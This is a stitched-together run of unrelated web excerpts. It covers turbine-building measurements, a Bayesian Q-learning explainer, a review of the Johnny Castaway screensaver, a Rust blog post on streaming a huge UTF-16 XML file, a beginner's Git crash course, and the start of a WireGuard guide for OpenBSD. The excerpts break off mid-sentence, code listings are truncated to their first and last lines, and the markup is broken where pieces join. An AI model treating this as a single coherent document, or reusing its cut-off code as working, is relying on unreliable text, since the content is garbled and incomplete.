<p>If the holes on your template are laid out a little differently  than those in the animation it'll be because the template is more  up to date.</p>
<p>Remove the template and unpeg the formers.<br>
  Place a former  with the 24cm line slightly overhanging the edge of the table. Place  the straight edge on the middle line and bend up to 90 degrees.  Repeat with all six, with three formers bent shiny side up and three  bent shiny side down. <br>
  Put the formers aside. </p>
<p><strong>6</strong><strong>:</strong><br>
  Take an aluminium sheet  and flatten out any bends in the metal. Cut the long edge down to  67cm.</p>
<p>Draw a line 2cm from one of the 67cm edges, flip the sheet over  and draw another line 2cm from the opposite edge on the other side of  the metal.</p>
<p>repeat with 2 more sheets and peg all 3 together so that each  drawn line is aligned to the edge of the sheet above it.</p>
<p>Mark the edge at 4cm, 6, 8, 10, 18, 26, 34, and then every 2cm up  to and including 64cm<br>
  Keep in mind that one side has a score at  4cm from the edge, the other at 3cm.</p>
<p>Flip the sheets over, making sure they don't lose their alignment.  Mark and score the same as the first edge. Make sure both have the  4cm gap on the same edge.</p>
<p><strong>7</strong><strong>:</strong><br>
  Tap the sheets on the  table so that they are aligned on top of each other.<br>
  From the  4cm end draw a vertical line at 19cm from the edge, and one at 33cm  from the edge.<br>
  Mark each line at 3cm and 20cm from both ends.</p>
<p>Drill all 3 sheets with 4mm holes at all 8 marks. If you're  making a six vane turbine rather than three you can drill all six  sheets at once as easily.<br>
  Unpeg the sheets.</p>
<p><strong>8:</strong><br>
  Place a sheet so that the second 3cm edge is  overhanging the table. Place the straight edge on …</p></div></div></div>

  <p>
    Recent work by Dabney et al. suggests that the brain represents reward predictions as probability distributions
    <d-footnote>
      Experiments were conducted on mice using single-unit recordings from the ventral tegmental area.
    </d-footnote><d-cite key="dabney2020distribtionmice"></d-cite>.
    This contrasts against the widely adopted approach in reinforcement learning (RL) of modelling single scalar
    quantities (expected values).
    In fact, by using distributions we are able to quantify uncertainty in the decision-making process.
    Uncertainty is especially important in domains where making a mistake can result in the inability to recover
    <d-footnote>
      Examples of such domains include autonomous vehicles, healthcare, and the financial markets.
    </d-footnote>. Research in risk-aware reinforcement learning has emerged to address such problems
    <d-cite key="morimura2010risksensitive,chow2018riskconstrainedrl"></d-cite>.
    However, another important application of uncertainty, which we focus on in this article, is efficient exploration
    of the state-action space.
  </p>

  <h2>Introduction</h2>

  <p>
    The purpose of this article is to clearly explain Q-Learning from the perspective of a Bayesian.
    As such, we use a small grid world and a simple extension of tabular Q-Learning to illustrate the fundamentals.
    Specifically, we show how to extend the deterministic Q-Learning algorithm to model
    the variance of Q-values with Bayes' rule. We focus on a sub-class of problems where it is reasonable to assume that Q-values
    are normally distributed
    and derive insights when this assumption holds true. Lastly, we demonstrate that applying Bayes' rule to update
    Q-values comes with a challenge: it is vulnerable to early exploitation of suboptimal policies.
  </p>

  <p>
    This article is largely based on the seminal work from Dearden et al. <d-cite key="dearden1998bayesianqlearning"></d-cite>.
    Specifically, we expand on the assumption that Q-values are normally distributed and evaluate various Bayesian exploration
    policies. One key distinction is that we model $$\mu$$ and $$\sigma^2$$, while the
    authors of the original Bayesian Q-Learning paper model a distribution over these parameters. This allows them to quantify
    uncertainty in their parameters as well as the expected return - we only focus on the latter.
  </p>

  <div><h4>Epistemic vs Aleatoric Uncertainty</h4></div>
  <div><p>
    Since Dearden et al. model a distribution over the parameters, they can sample from this distribution and the resulting
    dispersion in Q-values is known as <b>epistemic</b> uncertainty. Essentially, this uncertainty is representative of the
    "knowledge gap" that results from limited data (i.e. limited observations). If we close this gap, then we are left with
    irreducible uncertainty (i.e. inherent randomness in the environment), which is known as <b>aleatoric</b> uncertainty
    </p><d-cite key="kiureghian2007aleatoric"></d-cite><p>.

    </p><p>
    One can argue that the line between epistemic and aleatoric uncertainty is rather blurry. The information that
    you feed into your model will determine how much uncertainty can be reduced. The more information you incorporate about
    the underlying mechanics of how the environment operates (i.e. more features), the less aleatoric uncertainty there will be.

    </p><p>

    It is important to note that inductive bias also plays an important role in determining what is categorized as
    epistemic vs aleatoric uncertainty for your model.
    </p><p>

    <b>Important Note about Our Simplified Approach:</b></p><p>

    Since we only use $$\sigma^2$$ to represent uncertainty, our approach does not distinguish between epistemic and aleatoric uncertainty.

    Given enough interactions, the agent will close the knowledge gap and $$\sigma^2$$ will only represent aleatoric uncertainty. However, the agent still
    uses this uncertainty to explore.

    This is problematic because the whole point of exploration is to gain
    knowledge, which indicates that we should only explore using epistemic uncertainty.
    </p></div>


  

  <p>
    Since we are modelling $$\mu$$ and $$\sigma^2$$, we begin by evaluating the conditions under which it is appropriate
    to assume Q-values are normally distributed.

  <h2>When Are Q-Values Normally Distributed?</h2>

  <p>
    The readers who are familiar with Q-Learning can skip over the collapsible box below.
  </p>

  <div><h4>Temporal Difference Learning</h4></div>
  <div>
    <p>
      Temporal Difference (TD) learning is the dominant paradigm used to learn value functions in reinforcement learning
      <d-cite key="sutton1988tempdiff"></d-cite>.
      Below we will quickly summarize a TD learning algorithm for Q-values,
      which is called Q-Learning. First, we will write Q-values as follows <d-cite key="Sutton2017ReinforcementIntroduction"></d-cite>:
    </p>

    <d-math block="">
      \overbrace{Q_\pi(s,a)}^\text{current Q-value} =
      \overbrace{R_s^a}^\text{expected reward for (s,a)} +
      \overbrace{\gamma Q_\pi(s^{\prime},a^{\prime})}^\text{discounted Q-value at next timestep}
    </d-math>

      We will precisely define Q-value as the expected value of the total return from taking action $$a$$ in state $$s$$ and following
      policy $$\pi$$ thereafter. The part about $$\pi$$ is important because the agent's view on how good an action is
      depends on the actions it will take in subsequent states. We will discuss this further when analyzing our agent in
      the game environment.
    </p>

    <p>
      For the Q-Learning algorithm, we sample a reward $$r$$ from the environment, and estimate the Q-value for the current
      state-action pair $$q(s,a)$$ and the next state-action pair $$q(s^{\prime},a^{\prime})$$
      <d-footnote>
        For Q-Learning, the next action $$a^{\prime}$$ is the action with the largest Q-value in that state:
        $$\max_{a^{\prime}} q(s^{\prime}, a^{\prime})$$.
      </d-footnote>. We can represent the sample as:
    </p>

    <d-math block="">
      q(s,a) = r + \gamma q{(s^\prime,a^\prime)}
    </d-math>

    <p>
      The important thing to realize is that the left side of the equation is an estimate (current Q-value), and the right side
      of the equation is a combination of information gathered from the environment (the sampled reward) and another estimate
      (next Q-value). Since the right side of the equation contains more information about the true Q-value than the left side,
      we want to move the value of the left side closer to that of the right side. We accomplish this by minimizing the squared
      Temporal Difference error ($$\delta^2_{TD}$$), where $$\delta_{TD}$$ is defined as:
    </p>

    <d-math block="">
      \delta_{TD} = r + \gamma q(s^\prime,a^\prime) - q(s,a)
    </d-math>

    <p>
      The way we do this in a tabular environment, where $$\alpha$$ is the learning rate, is with the following update rule:
    </p>

    <d-math block="">
      q(s,a) \leftarrow \alpha(r_{t+1} + \gamma q(s^\prime,a^\prime)) + (1 - \alpha) q(s,a)
    </d-math>

    <p>
      Updating in this manner is called bootstrapping because we are using one Q-value to update another Q-value.
    </p>
  </div>

  

  <p>
    We will use the Central Limit Theorem (CLT) as the foundation to understand when Q-values are normally
    distributed. Since Q-values are sample sums, then they should look more and more normally distributed as the sample size
    increases <d-cite key="lecam1986clt"></d-cite>.
    However, the first nuance that we will point out is that rewards must be sampled from distributions with finite variance.
    Thus, if rewards are sampled distributions such as Cauchy or Lévy, then we cannot assume Q-values are normally distributed.
  </p>

  

  <p>
    Otherwise, Q-values are approximately normally distributed when the number of <b><i>effective timesteps</i></b>
    $$\widetilde{N}$$ is large
    <d-footnote>
      We can think of effective timesteps as the number of <b>full</b> samples.
    </d-footnote>.
    This metric is comprised of three factors:
  </p>

  <ul>
    <li>
      $$N$$ - <b>Number of timesteps</b>: As $$N$$ increases, so does $$\widetilde{N}$$.
    </li>

    <li>
      $$\xi$$ - <b>Sparsity</b>: We define sparsity as the number of timesteps,
      on average, a reward of zero is deterministically received in between receiving non-zero rewards
      <d-footnote>
        In the Google Colab notebook, we ran simulations to show that $$\xi$$ reduces the effective number of timesteps by $$\frac{1}{\xi + 1}$$:
        <a href="https://colab.research.google.com/github/brandinho/bayesian-perspective-q-learning/blob/main/Sparsity.ipynb">
          Experiment in a <span>Notebook</span>
        </a>
      </d-footnote>.
      When sparsity is present, we lose samples (since they are always zero).
      <!-- As sparsity increases, we essentially lose samples since they are always zero. -->
      Therefore, as $$\xi$$ increases, $$\widetilde{N}$$ decreases.
    </li>

    <li>
      $$\gamma$$ - <b>Discount Factor</b>:
      As $$\gamma$$ gets smaller, the agent places more weight on immediate rewards relative to distant ones, which means
      that we cannot treat distant rewards as full samples. Therefore, as $$\gamma$$ increases, so does $$\widetilde{N}$$.
    </li>

    <div><h4>Discount Factor and Mixture Distributions</h4></div>
    <div>
      <p>
        We will define the total return as the sum of discounted future
        rewards, where the discount factor $$\gamma$$ can take on any value between $$0$$ (myopic) and $$1$$ (far-sighted).
        It helps to think of the resulting distribution $$G_t$$ as a weighted mixture distribution.
      </p>

      <d-math block="">
        G_t = r_{t+1} + \gamma r_{t+2} + \gamma^2 r_{t+3} + ... + \gamma^{N-1} r_{t+N}
      </d-math>

      <p>
        When we set $$\gamma \lt 1$$, the mixture weights for the underlying distributions change from equal weight
        to time-weighted, where immediate timesteps have a higher weight. When $$\gamma = 0$$, then this is
        equivalent to sampling from only one timestep and CLT would not hold. Use the slider
        to see the effect $$\gamma$$ has on the mixture weights, and ultimately the mixture distribution.
      </p>

      <div>
        <div>
          <p>
              $$$$<br>
              $$$$
          </p>

      </div>

      <p><label for="barGammaMixture">$$\gamma$$ = <span></span></label></p>
    </div>
  </ul>

  We combine the factors above to formally define the number of effective timesteps:

  <d-math block="">
    \widetilde{N} = \frac{1}{\xi + 1}\sum_{i=0}^{N-1}\gamma^{i}
  </d-math>

  <p>
    Below we visually demonstrate how each factor affects the normality of Q-values
    <d-footnote>
      We scale the Q-values by $$\widetilde{N}$$ because otherwise the distribution of Q-values
      moves farther and farther to the right as the number of effective timesteps increases, which distorts the visual.
    </d-footnote>:

<blockquote>
<p><strong>Johnny Castaway</strong> is not a game. It’s a roguelike-like-like(unlike) screensaver with procedurally generated events during a day and night cycle.</p>
</blockquote>
</div>
<p>Indeed, Johnny is a screensaver, developed by Dynamix and distributed by Sierra in 1992, probably <strong>one of the best examples of a software designed like a game</strong>. Screensavers used to be pretty useful back in the eighties, when CRT first and plasma monitors then had burn-in issues: a static image shown for too long would “<strong>burn in” the screen like a ghost image haunting you from beyond the grave</strong>. Thus, screensavers were created in order to keep a moving image or pattern on the screen, should the pc not be used for a set number of minutes. They usually had other simple security features too but “saving the screen” was their primary objective. <strong>Most screensavers were rather simple affairs back then, </strong>like a field of white points on a black background, but Johnny came and changed the rules…</p>

	<div>
		<p>In 1992 <strong>Windows 3.1 revolutionized the way the user interfaced with the personal computer</strong> with all of its colours and animations, thus, it’s only natural that also screensavers got a little more fun. <strong>Johnny Castaway was the best example of little bits of fun in a serious program</strong>; part of the “Screen antics!” series by Dynamix which, as far as I know, began and ended there. Johnny is a castaway, as his surname might have already clued you in, stranded on a minuscule desert island in the middle of the ocean. Thus begin his antics:<strong> most of the time he would just stare at you through the screen or do mundane things</strong> like plucking a coconut to eat, sleep or read a book. <strong>Other times random crazy things would start happening</strong> like a mermaid coming over for dinner or an army of Lilliput-like minusule men who would conquer the island with a swarm of fighter planes, like a scene out of King Kong.</p>

	<div>
		<p>It was all pretty silly, but entertaining and I remember actually <strong>launching the screensaver and staring at it for minutes on end</strong>, waiting for something to happen. This is a Zen-like experience that many people back then experienced: launching <strong>King’s Quest or waiting for the screensaver to run</strong>? Terry Pratchett in Feet of Clay, described police inspector <strong>Sam Vimes as someone who thought that “life was so full of things happening erratically in all directions that the chances of any of them making some kind of relevant sense were remote in the extreme</strong>“. <strong>Johnny Castaway</strong> is always full of things happening, some of them rarely make sense, but that’s the beauty of it, a program that also managed to inject a lot of fun in your daily routine. I think that is the one valuable lesson for all modern software, not just videogames. Its main design idea was years ahead of its time, randomly generating the comical events that would befall Johnny each time. All the while in the background <strong>the “plot” progressed in real time</strong>, as shown by the raft that our hero kept building during the different vignettes.</p>

	<div>
		<p>The graphics were simple but effective, <strong>with a comic book style reminescent of Sunday strip comics like B.C</strong>. There was no music to speak of, it’s the sound effects I remember fondly, even more than the graphics. Those were limited to a few sighs, screams and singing from Johnny, but they surely did the job. I distinctly remember a few times when my family was having lunch and in the background the screensaver was running, sometimes the sound was so loud everyone would be startled. Also, <strong>the sound effects acted as an alert that something not seen before was happening</strong>, so I’d actually come running to see what was going on, like you would if you heard the Willy Prince of Bel Air theme song.</p>

</div></div></div></div><div><div><div><div>
	<div>
		<p>The program would also check the Windows calendar and <strong>recognize specific dates like Halloween, Christmas, New Year’s Eve</strong> and conjure up a related item on the island with Johnny. There was an overarching plot, which, most of the time would not exactly coincide with the first launch of the program but happen randomly, as with all things in Johnny. So you’d basically have to pierce the story together, like if <strong>you’d be watching Downton Abbey on shuffle</strong>. Ok maybe not that complicated… The plot would also loop: <strong>our shipwrecked friend is saved by a woman who has received his messages in a bottle</strong> (cue Sting) <strong>and goes back to his boring office job</strong>. Naturally, soon the routine wears his spirits down and he starts dreaming of the peaceful days on the island, thus, in the end, he goes back and everything starts all over again.</p>

	<div>
		<p>Even though <strong>JC’s events system is obviously not that complex, the idea of randomly cycling through different scenes while keeping a coherent plot happening in the background, was avantgarde for 1992</strong>. Randomly generated roguelike games were already a thing in the late 80s, so porting the same idea to a screensaver was the best design choice Dynamix could have made to render Johnny Castaway “that one screensaver you always want on your computer”. Nowadays it can still be run on a modern Windows 10 PC, that should give you an idea on how much the program is beloved by fans.<strong> I find it’s even better to run in the background one of the various “let’s play” Youtube videos</strong>, some more than 7 hours long, while you go about your day. In some weird way, that makes sense when I think about it, since JC was our little personal Youtube back in the early nineties: a small world that would make you smile and laugh, getting you away from life’s eternal worries at least for a bit.</p>

        <h3>2020-05-11</h3>

<p>A couple weekends ago, I found myself with the desire to fetch oil and gas production data for a specific county in New Mexico from the <a href="http://www.emnrd.state.nm.us/OCD/">New Mexico Oil Conservation Division</a> (OCD).</p>
<p>Fortunately, the OCD provides access to historical well production via an FTP server. I worked out that I needed to download <code>/Public/OCD/OCD Interface v1.1/volumes/wcproduction/wcproduction.zip</code>… and then my fortune ran out.</p>
<p>The first thing I noticed was the file size. The OCD doesn’t seem to provide a way to query a limited time- or area-based subset of production history data, so we’re stuck with a single zip file for “all of New Mexico since the dawn of time”<a href="#fn1" id="fnref1"><sup>1</sup></a>. The result is a whopping 712MB ZIP file.</p>
<p>Here’s where I knew I was in trouble: the only thing inside was a single 38 GB file called <code>wcproduction.xml</code>.</p>
<h3>“XML is like violence: when it fails, apply more”</h3>
<p>XML—the “extensible markup language”. Along with Java’s <code>AbstractBeanFactoryTemplateFactory</code>s, and the entirety of Geocities, XML epitomizes the excesses of the late 90s and early 2000s computing culture.</p>
<p>No two parsers can ever quite seem to agree on the details, and the verbosity quotient is such that an attempt to “print source” for the average “XHTML” web site circa 2001 would be likely to completely deforest the Amazon. The one thing that can be said in its favor is that it can indeed be used to somewhat faithfully represent a tree (the in-memory hierarchical structure, not the thing we just killed millions of).</p>
<p>Enough griping, though: the “XML everywhere” wave has long subsided. We’ve got to figure out how to deal with what it left behind. While it’s the most common approach to parsing XML, it’s also clear that loading the entire file into memory is unlikely to work: the workstation I’m writing this on only has 32GB of RAM. Additionally, it doesn’t make sense to build a syntax tree for the entire document when we are only interested in a small subset of the data. The XML world refers to this—here, unworkable—approach as a “DOM parser”, but it’s just the common case of parsing for any formal language—we incrementally construct an in-memory representation (that is, a syntax tree) of an entire document. It works well when we need the entire result and the in-memory representation fits comfortably within our resource budget: for instance, when compiling computer programs from source code, or rendering a web page from HTML.</p>
<p>Instead, we’ll use a streaming approach (the XML folks call this “SAX”, for reasons I didn’t care enough to research). In this approach, we’ll parse the document incrementally and receive results via an event-based API. This will let us only handle the data we care about, and minimize the amount we need to keep in memory at once.</p>
<p>For good performance on this “huge” data set, and to leverage an easily-accessible ecosystem of libraries which includes both streaming ZIP archive handling and high-performance streaming XML parsers, we’ll write a data extraction program in the <a href="https://www.rust-lang.org/">Rust</a> programming language.</p>
<h3>(Re)Write It In Rust</h3>

<p>I’m not going to belabor the reasons Rust is exciting here. It’s a statically-typed, compiled language with a nice mix of performance and control, expressiveness, and safety. I find it to be a nice choice for the sorts of “systems programming” tasks in which I might also use C or C++, but the build tools and package management system (<a href="https://crates.io/">Cargo</a>) also make it a viable choice for these sorts of “script-like” programs, especially when performance may be an issue.</p>
<p>Let’s begin by creating a new Rust project using Cargo. We want a program (binary), not a library:</p>
<pre><code>$ cargo new ocd_production --bin</code></pre>
<p>That’ll create a new directory <code>ocd_production</code> containing a Rust project. Inside we have a “hello world” program in <code>src/main.rs</code> and a specification for the project in <code>Cargo.toml</code>. The directory is also a <code>git</code> repository, which is handy.</p>
<p>There’s no sense in unpacking the ZIP file when we can stream our XML file out of it using the <a href="https://crates.io/crates/zip"><code>zip</code></a> library. Let’s begin by just previewing the text of the XML file.</p>
<p>We’ll add <code>zip</code> to our <code>Cargo.toml</code>:</p>
<pre><code>[package]
name = "ocd_production"
version = "0.1.0"
authors = ["Derrick W. Turk &lt;dwt@terminusdatascience.com&gt;"]
edition = "2018"

[dependencies]
zip = "0.5.5"</code></pre>
<p>A caveat before we begin: this is going to be “script” quality code. My goal is to process one file quickly and reliably, not to build a reusable library or produce “production-ready” code. As such, this code is going to skip some “best practices”: everything will be in one long <code>main.rs</code> file, and error handling will be oriented toward catching error conditions and aborting the program rather than toward error recovery or human-friendly error messages.</p>
<p>With that in mind, let’s write a short program in <code>src/main.rs</code> to take a ZIP file path as a command-line argument, and stream a few KB at a time from the file contained inside:</p>
<pre id="cb3"><code><a id="cb3-1" data-line-number="1"><span>use</span> std::<span>{</span></a>

<a id="cb3-35" data-line-number="35"><span>}</span></a></code></pre>
<p>We’ll compile in “release mode” (that is, with optimizations enabled) and run against the ZIP file:</p>
<pre><code>$ cargo run --release wc_production.zip</code></pre>
<blockquote>
<p><code>file is wcproduction.xml, size 38535541060 bytes</code><br>
<code>Error: Utf8Error { valid_up_to: 0, error_len: Some(1) }</code></p>
</blockquote>
<p>That’s discouraging.</p>
<h3>Only 90s Kids Will Remember This File Encoding</h3>
<p>Like many “modern” languages, Rust’s standard string type is a <a href="https://en.wikipedia.org/wiki/UTF-8">UTF-8</a> encoded <a href="https://home.unicode.org/">Unicode</a> string. This is the right answer for a <a href="https://utf8everywhere.org/">lot of good reasons</a>, but it’s only become popular in recent years.</p>
<p>In this case, we’ve clearly encountered some text which is not encoded in UTF-8. In fact, we’ve hit an invalid byte as the very first byte. Let’s look at raw bytes, rather than Rust strings, so that we can see what’s going on. We’ll edit <code>src/main.rs</code>:</p>
<pre id="cb5"><code><a id="cb5-1" data-line-number="1"><span>use</span> std::<span>{</span></a>

<p>At this point, recovering Windows programmers and Java programmers are wincing in sympathy. Two things immediately stand out: first, we’ve got a series of bytes alternating between the printable ASCII range and zero, and second, we open with <code>0xFF 0xFE</code>—that’s a <a href="https://en.wikipedia.org/wiki/Byte_order_mark">BOM</a>. We’re dealing with <a href="https://en.wikipedia.org/wiki/UTF-16">UTF-16</a> in <a href="https://en.wikipedia.org/wiki/Endianness">little-endian</a> byte order.</p>
<p>If you want the short version of how we got here, I suggest reading <a href="https://www.kingjamesbibleonline.org/Genesis-Chapter-11/">Chapter 11 of the Book of Genesis</a>.</p>
<p>The slightly longer version goes like this: in the late 80s, some forward-thinking folks began thinking seriously about the fact that non-Americans were using computers. In fact, some of the world’s computer users weren’t even Europeans, who could usually get away with smuggling some funny accented Latin characters into that “unused” eighth bit of <a href="https://en.wikipedia.org/wiki/ASCII">ASCII</a>. Of course, the non-Latin alphabet folks were doing just fine on their own: they had their own character sets and encodings.</p>
<p>But wouldn’t it be nice if we could all share one universal character set? Some sort of… “Uni”versal “code”? Surely, they reasoned, the Chinese/Japanese/Korean (CJK) character sets, the Latin alphabet, the Cyrillic alphabet, and anything else of interest could all be encoded into a shared 16-bit range. 65,536 characters should be enough for all the world’s languages! We’d just decide that the new “character type” was a 16-bit integer instead of an 8-bit integer; strings could still be arrays of these characters, and doubling the storage required for existing ASCII text was an acceptable price to pay for global harmony. Big names committed to this new “Universal Character Set” (<a href="https://en.wikipedia.org/wiki/Universal_Coded_Character_Set">UCS-2</a>): Microsoft rebuilt Windows’ string handling to use strings of two-byte UCS-2 “wide characters”, and the hot new Java programming language made the same decision.</p>
<p>As you can imagine, 65,536 characters did not turn out to be nearly enough for all the world’s languages—much less the wave of weird 👩‍👩‍👦‍👦 characters 💯 yet to 🔜 appear. Unicode ended up adopting a 32-bit address space, supporting over 4 billion characters. We’re unlikely to fill that any time soon, even given the breathtaking pace of emoji creation.</p>

    <p>I have few frustrations with the way my computer science degree is taught, but my biggest by far has 
been the conspicuous lack of practical skills such as Git.</p>
<p>I understand this is partly by design, because it's a computer science degree and not a software 
engineering degree, but only 1 or 2 months in, you start being assigned group projects that pretty 
much require version control. I've also heard this complaint about computer science degrees before, 
so with that in mind, here's a crash course.</p>

Goals &amp; Assumptions</h2>
<p>My goal with this crash course is to get you to the point where you can contribute to a pair or 
group project effectively. I'm not aiming for you to understand the inner workings of Git, but it's 
important that I explain enough for you to build a basic mental model.</p>
<ol>
<li>
<p>I'm going to assume that you understand how to navigate in the terminal (using commands such as 
<code>cd</code> and <code>ls</code>).</p>
<blockquote>
<p>At some point, I'll write a tutorial on this too and link to it here, but for now you'll have 
to fend for yourself (sorry).</p>
</blockquote>
</li>
<li>
<p>If you're on Windows, I'm going to use Unix terminology and assume that you can translate as 
needed; sorry about that, but I'm not well-versed enough with the Windows developer ecosystem to 
do that. As far as I understand, if you're using Git Bash or WSL, you don't need to worry about 
this.</p>

<p>I'm very open to <a href="https://git.sr.ht/%7Enerosnm/neros.dev">patches</a> or 
<a href="mailto:soren@neros.dev">emails</a> that correct this paragraph if needed.</p>

Version Control</h2>
<h3 id="what">
<a href="#what" aria-label="Anchor link for: what">###</a>

What</h3>
<p>Version control has two main purposes:</p>
<ul>
<li>Keeping track of changes that are made to files.</li>
<li>Integrating together changes made by multiple people.</li>
</ul>
<p>Git is the version control software that's most commonly used by software developers, and with good 
reason; when Git came around, it was able to replace a lot of other tools that are now widely 
regarded as having been much harder to use and more error-prone.</p>
<p>Lots of other software that you might have used has version control features, to more or less of an 
extent (e.g. Google Docs and Microsoft Word). Google Docs is a particularly visible example; 
multiple people can edit the same document at the same time and all of their changes are kept, and 
it does have a version history.</p>
<h3 id="why">
<a href="#why" aria-label="Anchor link for: why">###</a>

Why</h3>
<p>At this point, you might be thinking that another piece of software to do this is unnecessary, or an 
inconvenience. You might be thinking that you've been getting by just fine until now. In that case, 
here are just a few of the reasons why I think learning Git is worth the effort:</p>
<ul>
<li>
<p>It provides a version history. If something breaks, you can search back through that history 
easily and find out exactly what change broke it.</p>
</li>
<li>
<p>It can merge changes made by multiple people. Once you've learned how to use basic Git, there's 
almost no extra effort required to learn how to merge changes, which, in most cases, can be done 
without requiring you to do any manual editing.</p>
</li>
<li>
<p>It stores authorship information. If you were taught to add comments to the top of files with your 
name in them, guess what? You won't have to do that anymore. Git can tell you who authored every 
single <em>line</em> of every file.</p>
</li>
<li>
<p>It's an industry standard. Most software engineering jobs will require you to know how to use it, 
or will train you on it immediately, because it's considered essential.</p>
<blockquote>
<p>Personally, if I applied for a job and they didn't consider Git essential and require me to 
know how to use it, I would consider that a red flag.</p>
</blockquote>
</li>
</ul>
<h2 id="getting-started">
<a href="#getting-started" aria-label="Anchor link for: getting-started">##</a>

Getting Started</h2>
<p>With that out of the way, let's start by <a href="https://git-scm.com/book/en/v2/Getting-Started-Installing-Git">installing 
<code>git</code></a>. Once you've done that, make 
sure you configure your authorship information:</p>
<pre><code><span>$ git config --global user.name </span><span>"Your Name"
</span><span>$ git config --global user.email youremail@example.com
</span></code></pre>
<p>You might also want to configure which editor Git should use. The default (if you haven't set up a 
default editor with <code>$EDITOR</code>) is probably <code>vim</code>, which could be frustrating if you don't know how 
to use it. For example, you could set the editor to Visual Studio Code:</p>
<pre><code><span>$ git config --global core.editor </span><span>"code --wait"
</span></code></pre>
<blockquote>
<p>You can find more information about first-time setup <a href="https://git-scm.com/book/en/v2/Getting-Started-First-Time-Git-Setup">here</a>, and information about setting 
your text editor <a href="https://help.github.com/en/github/using-git/associating-text-editors-with-git">here</a>.</p>
</blockquote>
<h2 id="repositories">
<a href="#repositories" aria-label="Anchor link for: repositories">##</a>

Repositories</h2>
<p>Git works by designating a particular folder as a "repository", which means that it will track 
changes to any files in that folder or its children.</p>
<p>I'll put commands throughout this article that you should run to follow along. To start, create a 
folder, move inside, and designate it as a Git repository:</p>
<pre><code><span>$ mkdir git-crash-course
$ cd git-crash-course
$ git init .
Initialized empty Git repository in /Users/soren/src/localhost/git-crash-course/.git/
</span></code></pre>
<p><code>git</code> has created a folder called <code>.git/</code> inside <code>git-crash-course/</code>. This is where it will store 
information about the history of changes you've made to the contents of this repository.</p>
<h2 id="changes">
<a href="#changes" aria-label="Anchor link for: changes">##</a>

Changes</h2>
<p>In order to understand how Git tracks changes, we need to actually make some changes first. Create a 
file at the root of the repository with some text in it:</p>
<pre><code><span>$ echo </span><span>"Hello, world!" </span><span>&gt;</span><span> foo.txt
$ ls -a
./       ../      .git/    foo.txt
</span></code></pre>
<p>When you make changes to a file in a repository and then run <code>git</code>, it compares the state of the 
files with their state at a specific point in the past. You can ask about what changes it sees:</p>
<pre><code><span>$ git status
On branch master

No commits yet

Untracked files:
  (use </span><span>"git add &lt;file&gt;..."</span><span> to include in what will be committed)
        foo.txt

nothing added to commit but untracked files present (use </span><span>"git add"</span><span> to track)
</span></code></pre>
<p>There's a lot of information here, but what we care about is the section starting with "Untracked 
files". Git is telling us that it sees a file (foo.txt) that hasn't yet had any changes recorded. 
Because it hasn't seen this file before, it's labelled as untracked. To start tracking it, we need 
to create a <strong>commit</strong>.</p>
<h2 id="commits">
<a href="#commits" aria-label="Anchor link for: commits">##</a>

Commits</h2>
<p>A commit is simply a bundle of changes, packaged up together and given a message to describe what 
those changes represent. This is the basic unit of organisation in Git's model of changes.</p>
<p>Let's create a commit for the change we made. The first thing to do is designate which changes to 
include in the commit:</p>
<pre><code><span>$ git add foo.txt
$ git status
On branch master

No commits yet

Changes to be committed:
  (use </span><span>"git rm --cached &lt;file&gt;..."</span><span> to unstage)
        new file:   foo.txt
</span></code></pre>
<p>Now, the changes we made to <code>foo.txt</code> have been designated as "to be committed", more commonly 
referred to as "staged". Only changes that are staged will be included when we create a commit.</p>
<blockquote>
<p>To be precise, the change that's been staged is the creation of the file <code>foo.txt</code> with its 
current contents.</p>
</blockquote>
<p>Now, let's create a commit to package up those changes and describe them:</p>
<pre><code><span>$ git commit -m </span><span>"Add foo.txt"
</span><span>[master (root-commit) ffbbc5a] Add foo.txt
 1 file changed, 1 insertion(+)
 create mode 100644 foo.txt
</span></code></pre>
<p>We've used the <code>-m</code> flag to provide a message describing the commit. Convention dictates that 
commits are phrased in the <em>imperative</em> tense. In other words, say "add foo.txt", not "added 
foo.txt" or "adds foo.txt".</p>
<blockquote>
<p>This makes more sense if you think about the history of commits in a repository as describing the 
steps required to go from an empty folder to one containing all of the files in their current 
state. From that perspective, each commit is an <em>instruction</em> to Git to perform one of those steps 
in the change history: so we tell Git <em>to add</em> foo.txt, rather than telling it <em>that we added</em> 
foo.txt.</p>
</blockquote>
<p>If we run <code>git status</code> again, we see that now all the changes have been committed, we have what's 
called a "clean working tree": there aren't any changes in any files that haven't been committed.</p>
<pre><code><span>$ git status
On branch master
nothing to commit, working tree clean
</span></code></pre>
<p>Let's make a couple more commits. First, add a second file:</p>
<pre><code><span>$ echo </span><span>"See foo.txt for a message!" </span><span>&gt;</span><span> bar.txt
$ git add bar.txt
$ git commit -m </span><span>"Add some instructions"
</span><span>[master 18e31b4] Add some instructions
 1 file changed, 1 insertion(+)
 create mode 100644 bar.txt
</span></code></pre>
<p>Now, make some changes to an existing file, and notice the different output of <code>git status</code> after 
you make the change:</p>
<pre><code><span>$ echo </span><span>"Here's another line." </span><span>&gt;&gt;</span><span> foo.txt
$ git status
On branch master
Changes not staged for commit:
  (use </span><span>"git add &lt;file&gt;..."</span><span> to update what will be committed)
  (use </span><span>"git restore &lt;file&gt;..."</span><span> to discard changes in working directory)
        modified:   foo.txt

no changes added to commit (use </span><span>"git add"</span><span> and/or </span><span>"git commit -a"</span><span>)
</span></code></pre>
<p>You'll notice this time that the changes are marked as "not staged for commit", rather than having 
files listed as "untracked". That's because Git is comparing the current state of our files to the 
last commit, and since <code>foo.txt</code> already existed in the last commit, it recognises that all we're 
doing is changing some lines inside the file.</p>
<p>If you want to see exactly what those changes are, run <code>git diff</code>, and you'll see something like 
this:</p>
<pre><code><span>diff --git a/foo.txt b/foo.txt
index af5626b..bdfc7b8 100644
</span><span>---</span><span> a/foo.txt
</span><span>+++</span><span> b/foo.txt
</span><span>@@ -1 +1,2 @@
 Hello, world!
</span><span>+</span><span>Here's another line.
</span></code></pre>
<p>Now stage and commit this.</p>
<pre><code><span>$ git add .
$ git commit -m </span><span>"Update foo.txt"
</span><span>[master ed1fa47] Update foo.txt
 1 file changed, 1 insertion(+)
</span></code></pre>
<blockquote>
<p>You can pass <code>git add</code> a path instead of individual filenames to add all changes in the folder at 
that path. …</p></blockquote></article></div>

<p>Learn how to securely tunnel smart phone traffic
over a <a href="https://www.wireguard.com/">WireGuard</a> VPN with an
<a href="https://www.openbsd.org/">OpenBSD</a> 6.8 endpoint using the newly
released in-kernel <a href="https://man.openbsd.org/OpenBSD-6.8/wg">wg(4)</a>
driver with only base utilities.</p>

<h2 id="why-tunnel-internet-traffic">Why tunnel internet traffic?</h2>
<p>When you browse the internet, check emails, use social media, etc. on
